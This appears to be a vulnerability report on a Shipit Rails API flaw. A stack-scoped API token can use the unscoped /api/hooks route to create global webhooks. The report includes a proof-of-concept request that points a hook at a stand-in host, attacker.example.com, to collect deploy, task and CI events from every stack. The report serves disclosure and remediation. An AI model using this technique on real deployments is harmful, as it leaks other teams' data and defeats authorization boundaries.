### Title
Stack-scoped `ApiClient` can create a global `Hook` via the unscoped `/api/hooks` route, escalating read access to all stacks' deploy/task/status events - (File: `app/controllers/shipit/api/hooks_controller.rb`)

### Summary
`config/routes.rb` exposes two `hooks` resources: a stack-nested one (`/api/stacks/*stack_id/hooks`) and a top-level, unscoped one (`/api/hooks`), both routed to the same `Shipit::Api::HooksController`. The controller derives its data scope purely from `params[:stack_id]` rather than from the authenticated `ApiClient`'s own `stack_id` authorization scope, so a token that is supposed to be limited to one stack can create a hook with `stack_id: nil` (global) by simply calling the unscoped route, and that hook then receives events for every stack in the installation.

### Finding Description
`Shipit::Api::BaseController` scopes stacks by the api client's authorization: [1](#0-0) 

This is the intended equality binding: `current_api_client.stack_id` (the stack the token is *authorised* for) must equal the stack any given API action *touches*. This binding is correctly enforced for stack-scoped resources such as `deploys`, `tasks`, `commits`, etc., because those controllers all call `stack` (which routes through `stacks.from_param!`).

`Shipit::Api::HooksController`, however, computes its own `stack_id` independently of the api client's scope, and only when a `stack_id` route param is actually present: [2](#0-1) 

The route table registers the same controller under both a stack-scoped path and an entirely unscoped, top-level path: [3](#0-2) 

When the unscoped route (`POST /api/hooks`, `GET /api/hooks`, etc.) is used, `params[:stack_id]` is absent, so `stack_id` returns `nil` without ever calling `stack` (and therefore without ever consulting `stacks`, the method that actually enforces `current_api_client.stack_id`). The resulting `hooks` scope becomes `Hook.where(stack_id: nil)` — i.e. the set of **global** hooks: [4](#0-3) 

`require_permission :write, :hook` only checks that the permission string `write:hook` is present on the token; it never checks `current_api_client.stack_id`: [5](#0-4) 

A global `Hook` (`stack_id: nil`) is delivered for every stack's events, because delivery is looked up via `Hook.for_stack(stack_id)`, which always includes global hooks regardless of the specific stack that emitted the event: [6](#0-5) 

Put as an equality: the binding that should hold is `stack the ApiClient is authorised for == stack whose hooks are created/read`. The `HooksController` breaks this by deriving `stack_id` from an optional route parameter instead of from `current_api_client.stack_id`, so when the parameter is absent the check is skipped entirely rather than defaulting to the client's own restricted scope.

### Impact Explanation
An operator who issues a stack-scoped `ApiClient` (a token whose `stack_id` is set, intended to let an integration manage/read hooks only for its own stack) unintentionally grants that token the ability to:
- Create a global `Hook` (`POST /api/hooks`) pointed at an attacker-controlled `delivery_url`, subscribed to events like `deploy`, `task`, `commit_status`, `merge_status`, `pull_request`. Once created, this hook fires for **every** stack in the Shipit instance, not just the one the token is scoped to.
- List/read (`GET /api/hooks`) and manage all pre-existing global hooks (`show`/`update`/`destroy`), which can leak `delivery_url`/configuration of hooks belonging to other stacks/teams and allow tampering with them.

This constitutes an unauthenticated-by-design token escalating far beyond its authorized `stack_id` into reading/exfiltrating state (deploy status, task completion, merge/CI status) for stacks it was never granted access to — matching the "High: escalation into unauthorized read of stack state/task streams/deploy output" impact bucket via a credential/authorization boundary (the `ApiClient.stack_id` scope) that is not honored.

### Likelihood Explanation
Likelihood is high for any deployment where at least one stack-scoped `ApiClient` with `write:hook` (or even just `read:hook`) permission exists — a routine configuration, since scoped tokens with hook permissions are a documented/expected way to let CI/CD integrations manage their own stack's webhooks. No special privilege beyond possessing that one legitimately-scoped token is required; the attacker only needs to call the alternate, unscoped route instead of the scoped one.

### Recommendation
In `Shipit::Api::HooksController`, derive the effective `stack_id` from `current_api_client.stack_id` when the client is stack-scoped, regardless of whether `params[:stack_id]` is present, and reject (403/404) any attempt by a stack-scoped client to hit the unscoped `/api/hooks` route or to access/create hooks with a `stack_id` different from its own. Concretely, enforce the same `stacks`/`stack` scoping used by other API controllers, e.g. by making `hooks` always intersect with `stacks` (`Hook.where(stack_id: [nil].select { current_api_client.stack_id.nil? } + [stack_id].compact)`), or by disallowing `create`/`update` on global hooks entirely for scoped clients.

### Proof of Concept
1. Admin creates an `ApiClient` scoped to Stack A: `ApiClient.create!(creator: admin, name: "stack-a-integration", stack: stack_a, permissions: %w[read:hook write:hook])`.
2. Using that token's `authentication_token` for Basic Auth, call the unscoped route:
   ```
   POST /api/hooks
   Authorization: Basic base64(token)
   {
     "delivery_url": "https://attacker.example.com/collect",
     "events": ["deploy", "task", "merge_status", "commit_status", "pull_request"]
   }
   ```
3. This succeeds (`write:hook` permission check passes; `stack_id` resolves to `nil` since no `stack_id` route param exists) and creates `Hook#stack_id == nil`.
4. Any subsequent `deploy`/`task`/`merge_status`/`commit_status` event on **any** stack in the Shipit instance (`Hook.deliver` → `for_stack(stack_id)` includes global hooks) is now POSTed to `https://attacker.example.com/collect`, leaking deploy/task/CI state for stacks the token was never authorized to touch.
5. Confirmed structurally by test coverage showing the unscoped index path returns/operates on `Hook.global` (i.e., `stack_id: nil`) hooks independent of any api-client stack restriction: [7](#0-6) , with no corresponding test guarding against a stack-scoped client using this path.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
